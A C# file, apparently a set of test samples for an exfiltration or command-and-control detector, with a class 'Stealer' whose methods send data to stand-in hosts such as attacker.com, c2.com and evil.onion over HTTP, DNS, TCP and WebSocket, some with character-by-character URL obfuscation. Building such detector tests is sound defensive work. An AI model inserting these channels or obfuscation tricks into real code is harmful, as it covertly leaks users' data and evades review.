using System.Net.Sockets;
using System.Text;
using System.Net.WebSockets;

public class Stealer
{
    public void StealData()
    {
        string url = "http://attacker.com/exfiltrate";
        using (var client = new HttpClient())
        {
             client.GetAsync(url).Wait();
        }
    }

    public void CharObfuscation()
    {
        char h = 'h';
        char t = 't';
        char t2 = 't';
        char p = 'p';
        char o = 'o';
        char n = 'n';
        char i = 'i';
        char dot = '.';
        
        string proto = $"{h}{t}{t2}{p}://malware{dot}{o}{n}{i}on/c2";
        using (var client = new HttpClient())
        {
            var request = new HttpRequestMessage(HttpMethod.Post, proto);
            client.SendAsync(request).Wait();
        }
    }

    public void DnsC2()
    {
        string c2Domain = "evil.onion";
        System.Net.Dns.GetHostAddresses(c2Domain);
    }

    public void Base64Exfil()
    {
        string encodedPayload = "VGhpcyBpcyBhIGxvbmcgYmFzZTY0IGVuY29kZWQgcGF5bG9hZCB0aGF0IGlzIHN1c3BpY2lvdXM=";
        using (var client = new HttpClient())
        {
            var content = new StringContent(encodedPayload);
            client.PostAsync("http://c2.com/upload", content);
        }
    }

    public void PrivateIPExfil()
    {
        string internalServer = "192.168.1.100:8080";
        using (var client = new HttpClient())
        {
            client.GetAsync($"http://{internalServer}/data");
        }
    }

    public void ManyHops(string s)
    {
        string result = ss(s);
        string uri = ss("http://api.google.xyz/upload");
        using (var client = new HttpClient())
        {
            var content = new StringContent(result);
            client.PostAsync(uri, content);
        }
    }

    public string ss(string s)
    {
        return d(s);
    }
    public string d(string s)
    {
        return f(s);
    }
    public string f(string s)
    {
        return g(s);
    }
    public string g(string s)
    {
        return s;
    }
    public void SendToTcp()
    {
        SendAndReceive("malicious.server.com", 9000, "Sensitive data to exfiltrate");
    }
    public void SendAndReceive(string host, int port, string message)
    {
        using (var client = new TcpClient()) 
        {
            client.Connect(host, port); 
            using (var stream = client.GetStream())
            {
                var outBytes = Encoding.UTF8.GetBytes(message);
                stream.Write(outBytes, 0, outBytes.Length);

                var buffer = new byte[4096];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                var response = Encoding.UTF8.GetString(buffer, 0, bytesRead);
            }
        }
    }

    public void WEbSocketC2PlusCharObfuscation()
    {
        char w = 'w';
        char s = 's';
        char colon = ':';
        char slash = '/';
        char c = 'c';
        char two = '2';
        char s2 = 's';
        char o = 'o';
        char slash2 = '/';
        char e = 'e';
        char t = 't';

        RunAsync(new Uri($"{w}{s}{colon}{slash}{slash}{c}{two}.web{s2}{o}cket.com{slash2}{e}ndpoin{t}")).Wait();
    }

    public void WebSocketC2()
    {
        RunAsync(new Uri("ws://c2.websocket.com/endpoint")).Wait();
    }

    public async Task RunAsync(Uri uri)
    {
        using var ws = new ClientWebSocket();
        await ws.ConnectAsync(uri, CancellationToken.None);

        var sendBuffer = Encoding.UTF8.GetBytes("Hello C2");
        await ws.SendAsync(new ArraySegment<byte>(sendBuffer), WebSocketMessageType.Text, true, CancellationToken.None);

        var recvBuffer = new byte[4096];
        while (ws.State == WebSocketState.Open)
        {
            var result = await ws.ReceiveAsync(new ArraySegment<byte>(recvBuffer), CancellationToken.None);
            if (result.MessageType == WebSocketMessageType.Close)
            {
                await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "bye", CancellationToken.None);
            }
            else
            {
                var msg = Encoding.UTF8.GetString(recvBuffer, 0, result.Count);
                Console.WriteLine("Received: " + msg);
            }
        }
    }
}